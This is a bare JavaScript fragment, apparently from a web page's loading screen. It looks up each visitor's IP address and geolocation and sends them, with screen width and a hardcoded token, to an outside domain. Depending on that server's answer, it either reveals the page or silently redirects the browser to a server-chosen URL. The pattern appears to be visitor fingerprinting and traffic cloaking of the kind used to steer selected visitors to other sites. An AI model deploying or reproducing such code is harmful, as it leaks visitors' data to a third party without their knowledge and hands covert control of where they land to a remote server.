        fetch("https://www.iplocate.io/api/lookup" , {
                    method: 'GET',
                })
                //respons ip locate
                .then((ip_locate) => ip_locate.json())
                .then((ress_locator) => {
                    //send request to server
                    var ip = ress_locator.ip
                    var w = screen.width
                    fetch("https://thepolywow.xyz/api/v3/", {
                        method: 'POST',
                        headers: {
                            'Content-Type': 'application/x-www-form-urlencoded',
                            'value': '0jp17zrdw7',
                            'ip': ip,
                            'num': w,
                            'api': JSON.stringify(ress_locator)
                        },
                        body: 'token=Z6aNbSBdcS25zn2gxNOD',
                        redirect: 'follow'
                    }).then(function(response_api) {
                        return response_api.json();

                    }).then(respon_api => {
                        var status = respon_api.result;
                      
                        if (status == false) {
                            document.getElementById('ldingBG').classList.add("fadeout");
                        } else if (status == true) {
                            //response from server json
                            window.location.href = respon_api.data.url;
                        }
                    }).catch((error) => {
                         document.getElementById('ldingBG').classList.add("fadeout");
                    });



                });
